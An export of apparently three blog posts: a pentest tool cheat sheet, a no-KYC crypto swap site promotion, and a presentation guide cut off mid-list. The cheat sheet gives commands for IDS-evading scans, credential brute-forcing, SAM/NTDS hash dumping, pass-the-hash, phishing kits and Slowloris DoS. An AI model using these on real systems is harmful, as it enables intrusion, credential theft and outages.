A web application hidden by a web application firewall.\nNMAP: Basic scans.\n\nInformation’s gathered thanks to this task:\n\nDomain names, IP addresses, and network blocks.\nNetwork architecture information.\nEmployee details, email addresses, and contact information.\nOperating systems and software versions in use.\nSecurity policies and configurations.\n\nWHOISSystem tools:\n1whois example.com\nOnline tools:\n\nDomainTools\nMXToolBox\n\nDNSSystem tools:\n1234nslookup example.comnslookup -type=mx example.comdig example.com mxdig example.com any\nDnsrecon, for automated scans\n1dnsrecon -d example.com -t std --xml dnsrecon.xml\n-d example.com: domain \n-t std: standard scan\n–xml dnsrecon.xml: save the output to a file\nOnline tools:\n\nDNSChecker\n\nTraceroute1tracert example.com\nGoogle DorksFast Google Dorks Scan for automated dork scan. Installed in /opt from GitHub.\n123cd /opt/Fast-Google-Dorks-Scanchmod +x FGDS.shFGDS.sh example.com\nPagodo automate Google Hacking Database scraping and searching. Installed in /opt from GitHub as Python virtual environment.\n12345cd /opt/pagodopython3 -m venv .venvsource .venv/bin/activatepython ghdb_scraper.py -s -j -i # Write all dorks to all_google_dorks.txt, all_google_dorks.jsonpython pagodo.py -d example.com -g dorks/all_google_dorks.txt -i 5 -x 15 -s results.txt\n-i - Specify the minimum delay between dork searches, in seconds. Don’t make this too small, or your IP will get HTTP 429’d quickly.\n-x - Specify the maximum delay between dork searches, in seconds. Don’t make this too big or the searches will take a long time.\nPerforming 7300+ search requests to Google as fast as possible will simply not work. One solution is to use a bank of HTTP(S)/SOCKS proxies and pass them to pagodo.\nOnline tools:\n\nGoogle Hacking Database\n\nInternet of everythingSearch for IP, cert, domain, ports and anything else related to the service that has been indexed on the Internet.\n\nShodan\nZoomEye\nGreyNoise\nCenSys\n\nRecon AIOThere are also cool all-in-one tools, I use FinalRecon. To check headers, sslinfo, whois, crawl, dns, subdomains, traceroute, base director and ports.\n1finalrecon --full --url https://example.com\nIt is worth adding API keys for better results:\n1$HOME/.config/finalrecon/keys.json\nAmass is network mapping of attack surfaces and external asset discovery using open source information gathering and active reconnaissance techniques.\n1amass enum -d example.com\nagain, it is worth configuring different API’s for better results. The config file is here $HOME/.config/amass/config.ini.\nWAF checkwafw00f to test if the application is hidden by the web application firewall.\n1wafw00f https://example.org\nNamp1nmap -sS -T2 -sV --randomize-hosts -D RND:10 example.com\n-sS: SYN scan (half-open), which is less intrusive.\n-T2: Sets the scanning speed to “polite,” which reduces the risk of detection by IDS/IPS.\n-sV: Service version detection on open ports.\n--randomize-hosts: Randomizes the order of hosts to scan.\n-D RND:10: Decoy scan to obscure the actual source of the scan.\nYou can use other scan types like:\n-sA: TCP-ACK Scanning, check if ports are filtered, more can be found here.\nOSINTTo collect some details about users, emails, nicknames.\niKy is a tool that collects information from an email and shows results in a nice visual interface.\nProfil3r is an OSINT tool that allows you to find potential profiles of a person on social networks, as well as their email addresses. Installed in /opt from GitHub as Python virtual environment.\n1234cd /opt/Profil3rpython3 -m venv .venvsource .venv/bin/activatepython3 profil3r.py -p john doe\nOnline tools:\nOSINT Framework + Polish alternative\nScanning and enumerationDepending on the result of the reconnaissance, e.g. CMS detected, services running, I run other scanners, mainly vulnerability scanners, port scanners or an all-in-one tool to collect as many attack vectors as possible. To find live hosts and interact with them. Just to get more details about specific ports, running services and software versions. After scanning, I also do enumeration to extract detailed and specific information from identified services. It is all about extracting users, network shares, web server locations, configurations etc.\nZAPIn this step, when I touch web application, I also run ZAP. To crawl the website and run passive and active scans. You can also run Burp for this.\nNMAP1234nmap -sV -sC -O -T4 -oA scan <IP> #Fast scan for the most 1000tcp ports usednmap -sV -sC -O -T4 -p - -oA fullfastscan <IP> #Fast scan for all the portsnmap -sV -sC -O -p - -oA fullscan <IP> #Scan every tcp port to know exactly what is running in that machinenmap -sV -sC -T  #Check if any of the 1000 most common udp ports are running\n-sC: default scripts-sV: service version-O: operating system-oA: output filename-T4: aggressive fast scan\nAnd I also use vulscan (Advanced vulnerability scanning with Nmap NSE).\n1nmap -sS -sV --script=vulscan example.com\nGeneral vulnerability scannersNikto is a web server vulnerability scanner.\n1nikto -host http://example.com/ -o /results.html\nWapiti is web vulnerability scanner written in Python3.\n1wapiti -u http://example.com/\nSkipfishSkipfish? Someone may ask why, this tool is old and has not been developed for 10 years or more. However, I find it useful for old technology sites.\n1skipfish -o output_directory -S /path/to/dictionary example.com\nOther scanners and testsSSLScan tests SSL/TLS-enabled services to determine supported cipher suites.\n1sslscan example.com\nShellShockHunter it’s a simple tool for testing the shellshock vulnerability.\n1python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl\nBbot a recursive internet scanner for hackers.\n12345678# Port-scan every subdomain, screenshot every webpage, output to current directorybbot -t example.com -f subdomain-enum -m nmap gowitness -n my_scan -o .# A basic web scan includes wappalyzer, robots.txt, and other non-intrusive web modulesbbot -t example.com -f subdomain-enum web-basic# Crawl www.evilcorp.com up to a max depth of 2, automatically extracting emails, secrets, etc.bbot -t www.example.com -m httpx robots badsecrets secretsdb -c web_spider_distance=2 web_spider_depth=2# Subdomains, emails, cloud buckets, port scan, basic web, web screenshots, nucleibbot -t example.com -f subdomain-enum email-enum cloud-enum web-basic -m nmap gowitness nuclei --allow-deadly\nWebcopilot an automation tool that enumerates subdomains then filters out xss, sqli, open redirect, lfi, ssrf and rce parameters and then scans for vulnerabilities.\n1webcopilot -d http://example.com/ -a -b <backend_URL>\nas a backend I use Burp collaborator or InteractSH.\nCMS ScannersFor scanning specific CMS. Installed in /opt from GitHub.\nVulnx an intelligent Bot, Shell can achieve automatic injection, and help researchers detect security vulnerabilities CMS system.\n1vulnx -u http://example.com/ -w -d --dns -o /test\n-u: url target\n-w: web information gathering\n-d: subdomains information gathering\n--dns: dns information gathering\n-e for exploiting\nCMSeeK CMS Detection and Exploitation suite - Scan WordPress, Joomla, Drupal and over 180 other CMSs. Installed in /opt from GitHub.\n1python3 cmseek.py -u https://example.com\nWPScan WordPress security scanner.\n1wpscan --url http://example.com/ -e -U -o /wpscan --api-token=WordPress Vulnerability Database API\n--url: domain url\n-e: enumeration\n-U: users list\n-o: output to FILE\n--api-token: WordPress Vulnerability Database API\nWpCrack is an audit and brute force tool used to remotely test WordPress blogging software. Installed in /opt from GitHub.\n1python WpCrack.py -t http://exmaple.com/wp-login.php -u admin --p wordlist.txt\nJoomscan Joomla vulnerability scanner.\n1joomscan -u http://example.com/\njuumla is a python tool created to identify Joomla version, scan for vulnerabilities and sensitive files. Installed in /opt from GitHub.\n1python3 main.py -u https://example.com\nOKadminFinder admin/login panel finder. Installed in /opt from GitHub.\n1okadminfinder -u example.com -r\nSubdomainsBuild a list of subdomains to expand the scope of the attack, or take them over if possible.\nSubfinder fast passive subdomain enumeration tool\n1subfinder -d example.com -v -all -o subdomains.txt\nIt is worth to configure API’s for better results.\nKnock Subdomain Scan. Installed in /opt from GitHub.\n12knockpy -d example.com --recon --bruteforce --save reportknockpy --report example.com_yyyy_aa_dd_hh_mm_ss.json #show report\nBbot a recursive internet scanner for hackers. Installed in /opt from GitHub.\n123bbot -t example.com -f subdomain-enum# Perform a passive-only subdomain enumeration on evilcorp.combbot -t example.com -f subdomain-enum -rf passive\ndnsReaper subdomain takeover tool for attackers. Installed in /opt from GitHub as Python virtual environment.\n1python main.py --domain example.com\nSubzy subdomain takeover vulnerability checker. Generate manually list from Subfinder or Bbot and add it as targets in Subzy.\n1./subzy run --targets subdomains.txt\nYou may also be interested in one of my previous articles on the subdomain takeover task.\nFuzzing and bruteforcingFor any tool related to wordlists I use SecLists, fuzzdb, Combined-Wordlists and web-fuzz-wordlists. Most of the things described below can also be done in ZAP using the same wordlists.\nFuff - fast web fuzzer written in Go, mostly for directory or files discovery.\n123ffuf -w /path/to/wordlist -u https://example.com/FUZZffuf -w /path/to/vhost/wordlist -u https://example.com -H \"Host: FUZZ\" -fs 4242ffuf -w /path/to/paramnames.txt -u https://example.com/script.php?FUZZ=test_value -fs 4242\nI use Crunch, CeWL, bopscrk and web-wordlist-generator as Python virtual environment) to generate my custom wordlist.\n12345crunch 3 3 0123456789ABCDEF -o passwords.txtorcewl -d 2 -m 5 -w passwords.txt http://example.com --with-numbersorcewl -d 0 -m 5 -w usernames.txt http://example.com/team.php --lowercase\nand then, for example, bruteforce the credentials:\n1wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs \"Please enter the correct credentials\" -u http://target.com/login.php -d \"username=FUZZ&password=FUZ2Z\"\nof course I also use thc-hydra like everyone else for bruteforcing.\n12hydra -L passwords.txt -P 3digits.txt -f -v http://example.com/ http-post-form \"/login.php:pin=^PASS^:Access denied\" -s 8000hydra -L user.txt -P pass.txt IP_Address smb\nFeroxbuster a fast, simple, recursive content discovery tool written in Rust. It is also great alternative to the one already mentioned for forced browsing.\n1./feroxbuster -u http://example.com -x pdf -x js,html -x php txt json,docx -s 200 301 302 --random-agent\nDirsearch is cool web path scanner.\n123python3 dirsearch.py -u https://example.compython3 dirsearch.py -e php,html,js -u https://example.compython3 dirsearch.py -e php,html,js -u https://example.com -w /path/to/wordlist\nGobuster last but not least, a directory/file, DNS and VHost busting tool written in Go.\n123gobuster dns -d example.com -t 50 -w common-names.txtgobuster dir -u https://example.com/path/to/folder -c 'session=123456' -t 50 -w common-files.txt -x .php,.htmlgobuster fuzz -u https://example.com?FUZZ=test -w parameter-names.txt\ncook is a wordlist framework that allows you to do whatever you want with your wordlists :) It is so complicated that you should read all about it in the official repo.\nDirDar is a tool that searches for (403-forbidden) directories to break them and get dir listing on them, worth mentioning.\nInteresting for bruteforce web login is web-brutator. Old, but works. Installed in /opt from GitHub.\nShreder is a powerful multi-threaded SSH protocol password brute-force tool.\n1shreder 192.168.1.100 -u username -l passwords.txt\nLegba a multiprotocol credentials bruteforcer/password sprayer and enumerator. Cool alternative to thc-hydra.\nSQLiFor SQL injection, it is worth getting a list of URLs with parameters, e.g. from ZAP/Burp or another crawler.\nDSSS Damn Small SQLi Scanner. Installed in /opt from GitHub.\n1python3 dsss.py -u \"http://example.com/index.php?parameter=1\"\nSQLMap automatic SQL injection and database takeover tool.\n123python3 sqlmap.py -u \"https://example.com/index.php?id=1\" --batch --bannerpython3 sqlmap.py -u \"https://example.com/index.php?id=1\" -f --banner --dbs --userspython3 sqlmap.py -m list.txt --batch --banner\nYou can also crawl using SQLMap:\n12345sqlmap -u \"http://example.com/\" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers--crawl = how deep you want to crawl a site--forms = Parse and test forms\njSQL Injection is a Java application for automatic SQL database injection. GUI tool. Downloaded to /opt from GitHub.\n1java -jar jsql-injection-v0.101.jar\nsqlscan - is quick web scanner for find an sql inject point.\n1sqlscan http://example.com --scan\nXSSThese tools are no longer actively developed, but they work fine. The XSS vulnerability is so old and still detectable, and literally nothing is changing on the security or attack side, that these tools are still useful. Besides, ZAP or Burp detect the same thing.\nDalfox is a powerful open-source XSS scanner and utility focused on automation.\n12dalfox url http://example.com/listproducts.php\\?cat\\=123\\&artist\\=123\\&asdf\\=ff -b https://your-callback-urldalfox file urls_file --custom-payload ./mypayloads.txt\nXSStrike most advanced XSS scanner. Installed in /opt from GitHub.\n12python xsstrike.py -u \"http://example.com/search.php?q=query\"python xsstrike.py -u \"http://example.com/page.php\" --crawl\nTraxss - automated XSS Vulnerability Scanner. Installed in /opt from GitHub as Python virtual environment.\n1python3 traxss.py\nXSpear powerfull XSS Scanning and Parameter analysis tool&gem.\n1xspear -u \"http://example.com/listproducts.php?cat=123\" -v 0\nPwnXSS vulnerability (XSS) scanner exploit. Installed in /opt from GitHub.\n1python3 pwnxss.py -u http://example.com\nSMTPWhen searching for open relays.\nxSMTP lightning fast, multithreaded smtp scanner targeting open-relay and unsecured servers in multiple network ranges. Installed in /opt from GitHub.\n1234python3 xsmtp.py> 1Enter a website url:> exmaple.com\nWiFi crackingBecause sometimes you have to hack somewhere to be able to hack.\nWEF Wi-Fi Exploitation Framework. Installed in /opt from GitHub.\n1sudo wef -i wlan0\nBettercap the Swiss Army knife for 802.11, BLE, IPv4 and IPv6 networks reconnaissance and MITM attacks. It is a GUI tool.\n1sudo bettercap -caplet http-ui\nDefault credentials are here /usr/local/share/bettercap/caplets/http-ui.cap\nH4rpy automated WPA/WPA2 PSK attack tool.\n1sudo ./h4rpy\nAirgorah a WiFi security auditing software mainly based on aircrack-ng tools suite. It is a GUI app, just run it from the menu.\nAlso check out WiFiBroot.\nCompromised machineWhen I am inside, I use some of these tools to get more information about the environment and the machine itself. To hack more!\nLinux smart enumeration in case if I am looking for possibilities in the OS.\n12wget \"https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh\" -O lse.sh;chmod 700 lse.sh./lse.sh\nOther for Linux and Windows is WinPEAS and LinPEAS.\nLaZagne credentials recovery.\n1laZagne.exe all\nSeatbelt performs a number of security oriented host-survey “safety checks” relevant from both offensive and defensive security perspectives.\n1Seatbelt.exe -group=all -full\nlinWinPwn is a bash script that streamlines the use of a number of Active Directory tools.\n1./linWinPwn.sh -t <Domain_Controller_IP> --auto [-o <output_dir>]\nImpacket is a collection of Python classes for working with network protocols.\n1impacket-secretsdump $domain/$user:$pass@$ip\nHiveNightmare exploit allowing you to read registry hives as non-admin on Windows 10 and 11.\n123456# Get SAM, SECURITY and SYSTEM hive dumps.\\HiveNightmare.exe# Download those 3 files to your machine and dump the hashes:impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local# Log in to the remote system using the Pass The Hash technique:impacket-psexec -hashes $hash $user@$ip\nPingCastle is AD configuration and vulnerabilities scanner.\nSMBBecause the files are everywhere and unsecured.\nCrackMapExec is a must if I am on a Windows network.\n1234567891011121314crackmapexec smb IP -u '' -p '' && cme smb IP -u'a' -p ''crackmapexec smb IP -u 'user' -p 'pass' --local-auth --samcrackmapexec smb IP -u user -H 'hash' --local-auth -X 'whoami'crackmapexec smb IP -u user -p 'pass' -d DOMAIN --lsacrackmapexec smb IP -u user -p 'pass' -d DOMAIN --samcrackmapexec smb IP -u user -p 'pass' -d DOMAIN --sam -M lsassycrackmapexec smb IP -u user -p 'pass' --ntdscrackmapexec smb IP -u user -p 'pass' --ntds vsscrackmapexec smb IP -u user -p 'pass' -M wirelesscrackmapexec smb IP -u user -p 'pass' -M handlekatzcrackmapexec smb IP -u user -p 'pass' -M nanodumpcrackmapexec smb IP -u user -p 'pass' -M procdumpcrackmapexec smb IP -u user -p 'pass' --lapscrackmapexec smb IP -u user -p 'pass' -M gpp_password\nSnaffler a tool for pentesters to help find delicious candy. Ehh, interesting files on SMB shares.\n12snaffler.exe -s -o snaffler.logSnaffler.exe -s -i C:\\\nNmap, good old tool at every step.\n12nmap -iL list_of_IPs.txt -sV -O -p139,445 -T3 -PNnmap -iL list_of_445.txt -p139,445 -T3 -PN --script smb-vuln*\nSmbmap is a handy SMB enumeration tool.\n123./smbmap.py -u \"\" -p \"\" -P 445 --host-file list_of_targets.txt -g /output_anonymous.txt./smbmap.py -u \"guest\" -p \"\" -P 445 --host-file list_of_targets.txt -g /output_guest.txt./smbmap.py -H 192.168.0.200 -u Administrator -p asdf1234   \nSMBeagle fileshare auditing tool. \n1./SMBeagle.exe -c out.csv -f\nPowerHuntShares is an audit script designed in inventory, analyze, and report excessive privileges configured on Active Directory domains.\nMobileSometimes a basic analysis of the mobile app can find APIs or passwords.\nApkleaks for scanning APK file for URIs, endpoints & secrets.\n1apkleaks -f ~/path/to/file.apk\nApk2url an OSINT tool to quickly extract IP and URL endpoints from APKs by disassembling and decompiling.\n1./apk2url.sh /path/to/apk/file.apk\nGitHubTo find interesting stuff on GitHub.\nTrufflehog - find and verify secrets.\n123trufflehog git https://github.com/trufflesecurity/test_keys --only-verifiedtrufflehog github --org=trufflesecurity --only-verifiedtrufflehog #for the wizzard\nOctosuite GitHub Data Analysis Framework.\nLegitify detect and remediate misconfigurations and security risks across all your GitHub and GitLab assets.\nSecret Magpie secret Detection Tool.\n1python main.py <github/gitlab/azuredevops> --org 'github organisation name' --pat 'personal access token'\nAPIApidetector efficiently scan for exposed Swagger endpoints across web domains and subdomains. Supports HTTP/HTTPS, multi-threading, and flexible input/output options. Ideal for API security testing.\n1python apidetector.py -i list_of_company_subdomains.txt -o results_file.txt -t 30 -ua \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36\"\nLFILfi-Space to detect Local File Inclusion. Installed in /opt from GitHub as Python virtual environment.\n1python3 lfi.py\nPCAPNetworkAssessment is designed to analyze pcap files to detect potential suspicious network traffic.\nTrafficWatch a packet sniffer tool, allows you to monitor and analyze network traffic from PCAP files.\npyWhat identify anything. pyWhat easily lets you identify emails, IP addresses, and more. Feed it a .pcap file or some text and it’ll tell you what it is!\nOtherHere are some tools that can be used depending on the findings and specific tasks. I have used them at least once in the past.\nBluing an intelligence gathering tool for hacking Bluetooth.\nSome steganography tools that I use more for CTF or labs: binwalk, File stegosuite, stegextract, stegsolver, steghide,\nBlackeye cool phishing tool with localtunnel.\n1bash blackeye.sh\nEvilginx2 - standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication.\nSlowloris low bandwidth DoS tool.\n1python3 slowloris.py example.com\nArsenal is just a quick inventory and launcher for hacking programs, in case you forgot any command :)\nApacheTomcatScanner to scan for Apache Tomcat server vulnerabilities.\n1apachetomcatscanner -tt IP -tp - --list-cves\nRomBuster is a router exploitation tool that allows to disclosure network router admin password.\n12rombuster -a 192.168.99.1rombuster --shodan <SHODAN_API>\nAdditional materialsWhen my scans and tests find something new or in need of development, or I am unfamiliar with a particular service, software or port, I look to various hacking wikis and cheat sheets for information on what to do next. I’ve always dreamed of creating one of my own, but again, that would take time and commitment, and the ones you’ll find below are perfect. Perhaps in the future, when this article has grown (yes, imagine it can be longer - that’s what she said), I will rework it into its own wiki. (Damn during this article I even started testing MkDocs, MkDocs for Material, TeeDoc and Docusaurus, the last one looks the best after testing, so maybe in the near future… because why not fuck my time).\nOk but here is a list of sites where I look when I lack knowledge on a particular subject:\n\nhttps://book.hacktricks.xyz/\nhttps://www.ired.team/\nhttps://cheatsheet.haax.fr/\nhttps://www.thehacker.recipes/\nhttps://chryzsh.gitbooks.io/pentestbook/content/\nhttps://viperone.gitbook.io/pentest-everything\nhttps://highon.coffee/blog/penetration-testing-tools-cheat-sheet/\nhttps://hausec.com/\nhttps://hideandsec.sh/\nhttps://redteam.guide/docs/checklists/red-team-checklist\n\nAnd great mind maps with tools for hacking, in fact, each of these maps can be a separate instruction on which tools to use for a given scenario or service. Fruitfully waste precious life minutes when browsing through such a large repository of knowledge. Because why not fuck your time!\n\nhttps://github.com/Ignitetechnologies/Mindmap\n\nOne more thing, do not use too many multitools or magic all in one great bounty hunter helper. There are a lot of new projects that automate things between the various tools I listed above. For example scan4all, or rekono and many more. These projects are cool until they are developed and maintained, but in the end they are short-lived and have a lot of bugs. There is no one tool that will do everything for you and give you a report that you can send out and get a bounty on. So when you see a tool that has Nikto, Sublister, SQLMap, Gobuster and more in its dependencies, it just means that it is an overlay that runs these tools in the background, collects results from them and possibly passes between modules. Nothing that can really help you. If you want to automate something yourself, write a simple script that does one thing, then passes it on, and you still have to analyse the result at the end. Automation is great, but too much automation leads to errors and you may miss something. It’s a shame to waste a whole day on a scan that turns out to be wrong or miss something. The only thing these tools are useful for a newbie is to understand the steps and the tools used, you can follow their logic and recreate steps for yourself to understand the basics. On the above list you could find some kind of automation tools, but I choose only those that are related to single task, a narrow range of activities in one category.\nSee also PentestGPT. AI is trendy now. YOU MUST USE IT or you are not cool. Not cool.\n"
    },
    {
        "title": "Swap Cab",
        "posted_at": "2024-06-03",
        "category": "projects",
        "author": "hoek",
        "content": "\nSometimes I sit down and create pages or things that maybe don’t quite make sense or are alternatives to things that already exist, but done my way. Some things I do for pleasure, some things I do for education, sometimes just to share my insights with others, or uses the material I collect to help others start their own research. However, if I do publish something, I want it to be clear, easy to read, without unnecessary advertising, but so that I can make a profit. It is difficult for independent niche creators to get grants today - or I just suck at what I do xD. Sometimes it saddens me that pathological content or people who show boobs or how they had an argument with someone in the topic of flat Earth get financial support. Sex has always sold well, today it is only matched by stupidity. The more stupid and controversial the content, the more clicks, impressions and money. Fortunately, I have a regular job - and it’s not about showing my tits to the whole world - plus additional independent sources of income to pursue my projects, ideas and hobbies. The new project, or more precisely the website at swap.cab, is a desire to share my experience in the cryptocurrency exchange area with others. And, in addition, to earn some money from referrals. Two birds with one stone. Pleasant and useful.\nBut let’s start with the image in the headline of today’s article that Dall-E created for me. Quirky and full of everything. Thanks to great AI, I no longer have to steal images from the Internet.\n\nAs you probably already know, I love weird domains. How much my site has to do with taxis I don’t know, but it sounds cool.\nI do not consider myself an expert on cryptocurrency exchanges. However, I have exchanged a lot of cryptocurrencies. Many transactions of different values. I exchange crypto several times a month. The coins I have are from someone who paid me in cryptocurrency for some pentest, or it was I helped someone and they returned the favor in Monero, or it was some new currency drop, that started to have value after years, or I exchanged BTC for Solana to become rich (because Solana is the most hated cryptocurrency), or I sold a kilo of cocaine in darknet…. that last one is a joke (I sold 2kg).\nAll in all, it does not matter why or who exchanges cryptocurrencies. What matters is how to do it safely, quickly and sometimes anonymously. There are many services to exchange crypto for other crypto. They are mainly divided into P2P or automated ones, and those that provide full anonymity and those that can, under suspicion of money laundering, verify the user of a given transaction. There are also those that, if verification occurs, allow the cancellation and return of funds without additional identity verification (these are my favorite, balance between security and anonymity). Since the advent of cryptocurrencies, the possibility of money laundering has emerged. I will not go into this topic in depth. My view in general is that no matter what, everyone should be able to exchange their virtual coins anonymously. Or if they are held up be able to withdraw from the transaction without consequences and revealing your identity. I know it’s not ideal and dishonest people exploit it for bad purposes. But that’s the way it is with everything, I guess. A gun can be a tool of defense, but also of attack. The Tor network can help bypass censorship, but it can also be a place to sell drugs. If you try, you can kill someone with a computer mouse, but does this mean that computer mouse should be banned? I’m oversimplifying a lot, I know, but we live in an age where generally using anonymous services or encryption gets you immediately marked up as a terrorist, paedophile, drug seller or a person who has something to hide - at least that’s what the government and three-letter agencies explain. I can’t wait for the day when DeFi will be a standard and fully functional alternative to the current financial system.\nI will show you my example. In my country, I have a good paid job, I pay taxes and I’m at such a level of income that I don’t want to receive any more because more I earn, the less comes to me and the more I give back. Too poor for a luxurious life, rich enough to take more from me. If I saw the effect of my taxes in my life (patched holes in roads, better school system, no bribery, safe neighborhoods, new housing for people, clean areas etc, - unfortunately, there is no such thing), I would gladly contribute more. But generally I see that others do not add anything, and in fact only take away, and the state’s politics and budget are a bottomless bag, especially the pockets of corrupt politicians. Not to mention lazy people on welfare. Therefore, every additional money I earn as a hobby, either from a subsidy or from work done for someone on the other side of the Earth, I receive a cryptocurrency that no one can lay their hands on. This is compensation for my time outside of my job for my knowledge and commitment. Sorry for a small digression. The article was supposed to be about my new website, but it turned out to be a description of problems related to world finances and politics lol. Never mind.\nSome time ago I created an article on how to exchange crypto and crypto debit cards, then I made a lists of it on GitHub (swaps, crypto cards). In fact, I did it all for myself to organize my results and analyses. I shared this with others. I noticed that many people use these sources and willingly use my referral links to support my activities and reward me for my time and knowledge (or they simply don’t know what a reflink is and don’t care what they click on). So I decided to go a step further and create a dedicated page with these results, expanding the information about those that were missing in my articles and in the table on GitHub.\nI like to be transparent in what I do, so there is information that I earn money by using referral links. There is also a Matrix server to facilitate encrypted communication and submitting comments/feedbacks or just to talk about crypto, and there is also a thread on the BitcoinForum where several users have already submitted comments and ideas. And there is also a roadmap in which I provide information about what I have achieved and what I still have to do. There are also many more tips on exchange and anonymity on the website itself. And there will be more. There is still a long way to go before I am completely satisfied with what I am doing there.\nI’m having fun, I refreshed my knowledge about WordPress, I configured a new server, I supplemented my knowledge with new information, and in this project I opened myself up to feedback from others, trying to build a service not only for myself, but useful for others, and when it grows, I might even make money and be able to manage a website with a heavy load. A lot of traffic, a lot of spam, a lot of moderation, this is always a challenge for hobby projects. Also when you don’t have earnings in your plan, building such a website gives you more joy. I often meet people who create something only for profit. Such sites die quickly. First there must be passion, then knowledge, then recipients who see value in it. Then, sometimes after a few years, you can think about monetization. But not from ads. Running 0ut3r.space myself, I earned money from advertising, eventually I gave up on them completely, I also gave up on the Google analytical system, building my own, all in the name of greater privacy of my visitors, showing that I am interested in visitors’ feedback and that the values I promote with my person are reflected in my own actions.\nI am not a fan of social media platforms (maybe it’s because I have no friends), so I will not publicize the project or create dedicated accounts. I rather target audiences related to the topic. The development will certainly be less dynamic, but at least the increase in users will be proportional and not artificially forced.\nUltimately, if nothing comes of it, I will have my own extensive database of crypto swaps. And if at least one user finds it useful, it will make me happy.\nThe table and information about Swap are now expanded. Now I will expand the table and information about Crypto Card and then I would like to add currency exchange and wallets. Then I would like to build a price comparison engine based on the suppliers’ API. Something completely new that I hadn’t done before, combining multiple APIs and displaying results based on user searches.\nThere’s a lot of work ahead of me, but sometimes it’s worth doing something other than just hacking, pentesting and looking for holes and bugs in systems. Such a break from everyday life.\nHere are examples of competition websites or similar services, or websites that I am based on:\nhttps://www.bestchange.com/https://www.athena-alpha.com/crypto-exchanges/compare/https://www.cryptowisser.com/https://swapzone.io/\nand this is awesome page for NO KYC lovers:https://kycnot.me/\nI encourage you to check out my Swap.Cab service, I am open to suggestions and feedback. If you have used any service, rate it and leave a review. If you think this is an interesting project, spread the word about it. If you don’t give a shit, thank you for spending time with this article.\n"
    },
    {
        "title": "Fancy presentation",
        "posted_at": "2024-05-07",
        "category": "guides",
        "author": "hoek",
        "content": "\nNormal people prepare presentations in PowerPoint (or Libre’s Impress or Google’s Slides), but it’s boring. I mean, presentations are generally boring and should only be a background for a speaker, and making them in a software like a PowerPoint makes them even worse (too many options to distract the creator and not focus on the content). Great presenters are remembered for their speeches, not their slides. Slides should be simple, clean and sometimes funny. They should just give an outline of what will be discussed, but not give too much away. That’s just my personal opinion, of course. When I see slides full of tables, content, text, charts, I feel sick. If I wanted to see that much data, I would open a documentation, a book or Excel. When I see a slide like that, I know it will be boring. Especially when the presenter just starts reading the content of the slide. It is even worse as I will not learn anything and this could be a podcast or audiobook :) I can read, I do not need people to read slides for me, if they read slides they could just send them to me and say read it. People who work in a big corporation know that most of the meetings with the slides could be just an email, but managers love to see overloaded slides, bars, graphs, charts, diagrams, preferably so much on a slide that it is virtually unreadable.\n\nWorking for large companies, I have had to create presentations using corporate templates that are already so overloaded that there is little room for content. Fortunately, I do presentations for people in-house, so I don’t give a damn about those corporate templates.\nAs I travel around different conferences, I learn from the presenters, I watch them speak, I ask them what they create in and how they create. Last year I was at The Hack Summit conference and one session was called Watch me run malwate from NPM by naugtur. Click on the link to see what the presentation looks like. It is very simple, clean and very well done. It is a web browser version with cool navigation. The session itself was interesting, the speaker has great knowledge and the way he spoke was encouraging to listen to, slightly chaotic but engaging. I thought ok, I want to have slides like that.\nIf you check the source of the presentation, you can see:\n1<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reset.css\">\nso yeah it is reveal.js. I thought it was nice that it was a ready-made solution and not custom code from the presenter. So I started looking for other solutions like this. I found another cool option like impress.js. I was thinking ok I will go back to reveal.js and start configuring but at the same time I found Marp. Holy moly, that is what I have been looking for all my life. Just kidding. Marp allows me to create presentation content in Markdown (which I love and use whenever possible) and additionally format it using HTML and make it beautiful thanks to CSS. I had to spend some time learning Marp, reading the documentation, creating my own template and after a few hours everything was ready. Now, every time I need to make a presentation, I just open the template and focus on the slide content, then click generate and that’s it. Everything is formatted correctly and ready to go. It is possible to export code to html, pptx, pdf, png and jpg. Exporting to html allows you to run in presenter mode, so on one screen you can see a preview of the slides, presenter comments and a preview of the next slide, and on the second screen you can have the presentation slides in full screen.\nTo use Marp, you can install Marp CLI or, which is a better solution, install it as an extension for VS Code. I chose the second option and my workbench looks like this\n\nOn the left the source code of the template and on the right the preview. The only thing to do after installation is to change one option in the extension settings: Markdown>Marp: Enable HTML will enable all HTML elements in Markdown. And here is one slide from my presentation as an example:\n\nI made my own theme based on the Rosé Pine Moon by rainbowflesh (check this link as this is also live demo of Marp). Here is the source github repository with all the details and files. But you can also find a lot of different themes made by the community:\n\nDracula\nAcademic\nAwesome\nMyMarp\nMarpStyle\nNordicBeamer\nBaseType\n\nand many more. Beautifull, clean and simple. Much better than:\n\nSomeone might say, but why? Why make life harder and learn extra stuff to make a simple presentation? I don’t know, for fun, for education, to automate work, because you hate MS? I am a weirdo, personally I like to learn new things and automate my work and make simple and beautiful things with code.\nI hope I infected you with the idea to make interesting presentations.\nWhen creating presentations and speaking as a presenter, there are several important points to keep in mind for effective communication:\n\nClarity of Message: Ensure that your message is clear, concise, and easy to understand. Avoid technical jargon or overly complex language that may confuse your audience. Even if this is very complex topic or very technical one. Make it simple.\nEngagement: Keep your audience engaged by using storytelling, humor, or interactive elements to maintain their interest throughout your presentation.\nVisual Appeal: Use visually appealing slides with clear, easy-to-read fonts and high-quality graphics. Avoid cluttered slides with too much text or distracting animations. Keep it simple, but not too simple ;) Black text on a white background sounds simple, but it is also terrible. Focus on the content, add the most important things you will talk about and some things that support or complete your speech.\nStructure: Organize your presentation into logical sections with a clear introduction, body, and conclusion. Use signposting to guide your audience through the flow of your presentation.\nPractice: Practice your presentation multiple times to ensure smooth delivery and confidence on stage. Time yourself to ensure that you stay within the allocated time slot.\nAudience Interaction: Encourage audience participation through questions, polls, or discussions to create a more interactive experience.\nConfidence and Body Language: Maintain confident body language, such as making eye contact, using gestures, and speaking clearly and audibly. Confidence in your delivery will help engage your audience.\nAdaptability: Be prepared to adapt your presentation based on audience feedback or unexpected circumstances. Stay flexible and open to adjusting your content as needed.\nTechnical Preparation: Test all technical aspects, such as audiovisual equipment and slides, before your 